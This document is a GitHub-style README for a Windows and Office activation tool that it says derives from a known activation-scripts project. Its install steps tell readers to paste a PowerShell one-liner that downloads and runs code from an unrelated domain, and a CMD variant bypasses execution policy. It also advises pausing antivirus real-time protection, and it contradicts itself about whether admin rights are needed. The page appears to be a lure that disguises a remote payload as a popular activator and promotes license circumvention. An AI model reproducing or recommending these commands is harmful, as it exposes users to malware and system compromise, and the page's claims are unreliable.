<div align="center">

# Windows-Activation-Suite: HWID, Ohook, TSforge & Online KMS for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Uaene-code/system-activation-manager/main/frame_952571.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-INSTALLER-6366f1?style=flat&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-MIT-818cf8?style=flat&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-SUCCESS-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility for activating Windows and Office installations through four distinct methods: HWID, Ohook, TSforge, and Online KMS. It supports Windows 7, 8, 10, 11, and Server editions alongside Office 2010 through 2021 and 365, automatically detecting the installed edition and selecting an appropriate activation path. Each method operates through native Windows activation APIs without injecting DLLs or modifying core system files, and activation state can be backed up, restored, or reverted as needed. The suite also exposes diagnostic tooling for inspecting current activation status, distinguishing permanent from KMS-based licensing, and applying Extended Security Updates where applicable.

## ⚡ Install via PowerShell

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Paste and run
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

Windows-Activation-Suite provides four independent activation backends, each targeting a different product generation and licensing model. The tool detects the installed Windows edition and Office product automatically, then presents only the methods compatible with the detected configuration.

### Activation Methods

- **HWID** — Generates a permanent digital license tied to the machine's hardware fingerprint. Applies to Windows 10 and Windows 11 across Home, Pro, Enterprise, Education, LTSC, and IoT editions. The license persists across reboots and does not require renewal.
- **Ohook** — Hooks Office activation at the licensing layer to produce permanent activation without contacting Microsoft servers. Covers Office 2010 through 2021 and Office 365 subscription installations.
- **TSforge** — Offline activation path for legacy Windows releases. Designed for Windows 7, 8, and 8.1 where modern digital licensing is unavailable, and usable as a fallback where network-based methods are blocked.
- **Online KMS** — Server-assisted KMS activation for Windows and Office products that support volume licensing. Suitable for Windows Server 2016, 2019, and 2022, and for editions where HWID or Ohook do not apply. KMS activations carry a renewal interval and may require periodic re-runs.

### Windows Coverage

- **Windows 7** — Home, Pro, Ultimate, Enterprise
- **Windows 8 / 8.1** — Core, Pro, Enterprise
- **Windows 10** — Home, Pro, Enterprise, Education, LTSC
- **Windows 11** — Home, Pro, Enterprise, Education, IoT
- **Windows Server** — 2016, 2019, 2022

### Office Coverage

- **Office 2010, 2013, 2016, 2019, 2021** — all retail and volume editions
- **Office 365** — subscription-based installations

### Operational Utilities

- **Edition detection** — Reads the installed Windows and Office SKUs and selects compatible activation methods automatically, reducing the risk of applying an unsupported method.
- **Status reporting** — Displays the current licensing state, including activation channel, remaining grace period, and license type, before and after any operation.
- **Method selection** — Exposes both permanent (HWID, Ohook) and renewable (Online KMS) paths so operators can choose based on product and environment constraints.
- **Extended Security Updates** — Enables ESU provisioning for Windows 7 and Windows 10 installations that require continued patch delivery.
- **Backup and restore** — Captures the existing activation state to a local store and restores it on demand, supporting rollback after testing or hardware changes.
- **Reversibility** — Activation changes can be undone through the restore path, returning the system to its prior licensing state.

### Safety and Design Constraints

- **Native API usage** — Activation is performed through Windows' own licensing interfaces rather than by patching or injecting into system processes.
- **No core file modification** — The suite does not alter protected system binaries, which keeps the installation consistent with Windows update and integrity checks.
- **No DLL injection** — Ohook operates at the licensing layer without injecting code into running Office processes.
- **Open source** — The complete implementation is available for inspection, allowing operators to audit exactly which API calls and registry operations each method performs.
- **Maintained against updates** — Method implementations are revised as Windows and Office servicing updates change activation behavior.

## How It Works

Windows-Activation-Suite operates by routing activation requests through the native Windows Software Protection Platform (SPP) and Office licensing interfaces rather than patching or replacing protected system binaries. Each activation method targets a distinct licensing channel, and the suite selects the appropriate one based on the detected Windows or Office edition, build number, and current license state.

**Method dispatch and detection.** On launch, the suite enumerates installed products through the SPP WMI provider and the Office Click-to-Run and MSI licensing stores. It reads the current edition, channel, and partial product key, then maps that inventory to the activation methods compatible with the host. This detection layer prevents mismatched method selection, such as applying a hardware-bound license to a product that requires volume licensing.

**HWID.** For Windows 10 and 11, HWID activation computes a hardware-derived identifier from stable device attributes and submits a genuine ticket request to the licensing service. The returning digital license is stored by Windows and validated against the same hardware fingerprint on subsequent boots. Because the license is tied to the device rather than a product key, it survives reboots and feature updates without a renewal cycle.

**Ohook.** For Office, Ohook intercepts the license validation path at the user-mode licensing component level, supplying local license responses in place of a server round-trip. This yields persistent Office activation without an active connection or a background service, and it does not require modification of Office program files. The hook is loaded at runtime and can be removed cleanly.

**TSforge.** For Windows 7, 8, and 8.1, TSforge generates and installs a locally validated license token using the platform's offline activation mechanism. It operates without network access and without contacting any external activation server, relying on the token structure expected by the older SPP implementation.

**Online KMS.** When a KMS-compatible path is selected, the suite configures the client to use a KMS endpoint, installs the appropriate generic volume license key for the detected edition, and triggers activation through the standard SPP interface. KMS activation is periodic by design, so the suite reports the remaining validity window and can re-arm the client when needed. This path covers Windows Server and volume-licensed Office editions.

**State management and reversal.** The suite records the pre-activation license state before applying any change, enabling restore and rollback. Activation status queries return the live SPP state, so the reported status reflects what Windows itself reports. Reversal removes installed tokens, keys, or hooks and reinitializes the licensing service, returning the system to its prior condition.

**Execution model.** All operations run with administrative rights through the provided entry point. The suite does not install persistent drivers or services beyond those the selected method requires, and it validates the environment before each step to avoid partial or inconsistent activation states.

## Compatibility

Windows-Activation-Suite operates across a broad matrix of Microsoft platforms, selecting the appropriate activation method automatically based on the detected operating system and product edition. The utility requires an elevated PowerShell or Command Prompt session and runs without modifying core system files, relying instead on native Windows activation APIs and supported KMS or digital license mechanisms.

**Operating System Support**

| Platform | Supported Editions | Recommended Method |
|---|---|---|
| Windows 7 | Home, Professional, Ultimate, Enterprise | TSforge / Online KMS |
| Windows 8 / 8.1 | Core, Pro, Enterprise | TSforge / Online KMS |
| Windows 10 | Home, Pro, Enterprise, Education, LTSC | HWID / Online KMS |
| Windows 11 | Home, Pro, Enterprise, Education, IoT | HWID / Online KMS |
| Windows Server | 2016, 2019, 2022 | Online KMS |

**Office Product Support**

| Product | Supported Editions | Recommended Method |
|---|---|---|
| Office 2010 | All editions | Ohook / Online KMS |
| Office 2013 | All editions | Ohook / Online KMS |
| Office 2016 | All editions | Ohook / Online KMS |
| Office 2019 | All editions | Ohook / Online KMS |
| Office 2021 | All editions | Ohook / Online KMS |
| Office 365 | Subscription | Ohook |

**Method-to-Platform Mapping**

- **HWID** applies exclusively to Windows 10 and Windows 11, provisioning a permanent digital license bound to the device hardware. It is the preferred method for modern Windows editions and requires an active internet connection only during initial activation.
- **Ohook** targets Microsoft Office installations from 2010 through 2021 as well as Office 365, delivering permanent activation by hooking Office licensing components without altering core system files.
- **TSforge** serves legacy Windows releases (7, 8, 8.1) where modern digital licensing is unavailable, providing offline activation for supported editions.
- **Online KMS** functions as a cross-platform fallback for Windows Server, volume-licensed Windows editions, and Office products that require periodic KMS renewal rather than permanent licensing.

**Extended Security Updates**

The suite includes Extended Security Updates provisioning for Windows 7 and Windows 10, allowing enrolled devices to continue receiving security patches beyond standard end-of-support dates. ESU activation is handled through the same menu-driven interface and follows the method applicable to the detected platform.

**Programmatic Compatibility**

The activator detects the installed Windows edition and Office product automatically, presenting only the methods valid for the current environment. Activation state, digital license status, and KMS renewal periods are reported back through the console. Major cumulative Windows updates may require re-running the applicable method; minor updates typically preserve existing activation state. A backup and restore facility is available to capture and reapply activation state across system changes.

**Requirements**

- An elevated PowerShell or Command Prompt session is mandatory for all methods.
- Internet connectivity is required for HWID and Online KMS activation; TSforge and Ohook support offline operation after initial provisioning.
- Activation should only be applied to installations the user owns and is intended for educational and evaluation purposes.

## FAQ

**Q: Which activation method should I choose for my edition?**

A: The suite selects a method based on the detected product and edition. HWID applies to Windows 10 and 11 digital-license capable editions; Ohook applies to Office 2010 through 2021 and 365; TSforge covers offline activation for older Windows releases; Online KMS serves products without a permanent path, including Windows Server. Manual method selection is available when multiple paths are valid.

**Q: What is the difference between permanent and KMS-based activation?**

A: HWID and Ohook produce persistent activation tied to the hardware or Office installation and do not require renewal. Online KMS activation operates on a renewal cycle and must be refreshed periodically; the tool reports remaining validity so renewal can be scheduled before expiry.

**Q: Does the suite modify core system files or inject DLLs?**

A: No. Activation is performed through native Windows activation interfaces and does not patch core system binaries. Office activation via Ohook is scoped to the Office installation and is reversible through the tool's restore option.

**Q: Can activation be backed up and restored?**

A: Yes. The suite can capture the current activation state and restore it later, which is useful before reinstalling or migrating an installation. Restore requires the same product and edition context as the original backup.

**Q: Will Windows updates invalidate activation?**

A: Minor cumulative updates generally do not affect activation state. Feature updates and major version upgrades may reset activation and require re-running the suite. After any major update, verify status with the built-in activation status check.

**Q: Does the tool work without an internet connection?**

A: TSforge performs offline activation and requires no network access. HWID and Online KMS require connectivity during the activation step; once completed, permanent methods remain valid offline.

**Q: Which Windows Server versions are supported?**

A: Windows Server 2016, 2019, and 2022 are supported through Online KMS activation. Edition detection runs automatically, and the tool reports the resolvededition before applying activation.

**Q: How is Extended Security Updates handled?**

A: ESU activation is available for Windows 7 and Windows 10. The suite detects ESU eligibility and applies the appropriate activation path alongside the base product activation.

**Q: How do I remove activation applied by the suite?**

A: Use the restore or uninstall option in the tool, which reverts changes made during activation. For KMS-based activation, removing the configured KMS host and re-arming the product returns the system to its prior state.

**Q: Does the suite require administrative privileges?**

A: Yes. Activation modifies product licensing state at the system level and must run in an elevated session. Non-elevated execution will fail at the activation step with an access error.

**Q: Is the source code auditable?**

A: The project is fully open source. All activation logic is present in the repository, and no obfuscated binaries are distributed. Review the source before execution if auditability is a requirement.

**Q: Is use of this tool permitted?**

A: The suite is provided for educational purposes. Activating unlicensed software violates Microsoft's Terms of Service; use only on installations you own or are authorized to activate.

## Disclaimer

Windows-Activation-Suite is provided strictly as an educational and research tool for studying Windows and Office activation mechanisms. By downloading, executing, or otherwise using this software, you acknowledge that you have read, understood, and accepted the following terms.

**Intended Use.** This project is intended solely for legitimate testing, security research, and educational analysis on systems and software licenses you own or are explicitly authorized to evaluate. It is not intended for, and must not be used for, circumventing licensing requirements on installations you do not own or have not been licensed to activate.

**Legal Compliance.** Activation of unlicensed copies of Windows or Microsoft Office violates Microsoft's Terms of Service and may contravene applicable copyright and software licensing laws in your jurisdiction. You are solely responsible for ensuring that your use of this software complies with all applicable laws, regulations, and licensing agreements. The maintainers do not condone software piracy or license circumvention.

**No Warranty.** The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. The maintainers make no representations regarding the accuracy, reliability, or completeness of the activation methods implemented.

**Assumption of Risk.** Activation methods interact with core operating system activation subsystems. While Windows-Activation-Suite is designed to use native Windows activation APIs and avoid modification of core system files, no guarantee is made that operation will be free of side effects, including but not limited to activation state changes, system instability, or conflicts with future Windows updates. You assume full responsibility for any consequences arising from use of this software, including any impact on system integrity, data, or licensing status.

**Limitation of Liability.** In no event shall the authors, maintainers, or contributors be liable for any claim, damages, or other liability—whether in an action of contract, tort, or otherwise—arising from, out of, or in connection with the software or the use or other dealings in the software. This includes, without limitation, direct, indirect, incidental, special, exemplary, or consequential damages.

**No Affiliation.** Windows-Activation-Suite is an independent open-source project. It is not affiliated with, endorsed by, sponsored by, or in any way officially connected to Microsoft Corporation. All product names, trademarks, and registered trademarks are the property of their respective owners and are used here for identification purposes only.

**Third-Party Distribution.** Only obtain this software from its official project repository. Third parties may redistribute modified or malicious versions under the same name. The maintainers disclaim all responsibility for builds obtained from unofficial sources and cannot verify the integrity of altered distributions.

**User Responsibility.** You are solely responsible for verifying the integrity and authenticity of any build you execute, for reviewing the source code prior to use, and for determining whether use of this software is appropriate for your environment. If you do not accept these terms in full, do not use Windows-Activation-Suite.

## License

Windows-Activation-Suite is distributed under the MIT License, a permissive open-source license that grants full access to the source code for inspection, modification, and redistribution. The license terms permit use, copying, adaptation, and distribution of the software in both source and compiled forms, provided that the original copyright notice and permission notice are retained in all copies or substantial portions of the software.

The MIT License is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

The complete license text is included in the LICENSE file at the root of the repository and governs all use of the Windows-Activation-Suite codebase. Users who modify or redistribute the software are responsible for verifying compliance with these terms.

Windows-Activation-Suite derives from the open-source Microsoft Activation Scripts project by massgravel. All credit for the original activation methodology, scripting architecture, and foundational research belongs to the original developers. This project extends that work with additional tooling, documentation, and compatibility updates while preserving the original licensing obligations.

Usage of this software does not grant any rights to Microsoft products, product keys, or licenses. The MIT License applies solely to the source code of Windows-Activation-Suite and confers no authority over third-party software or services.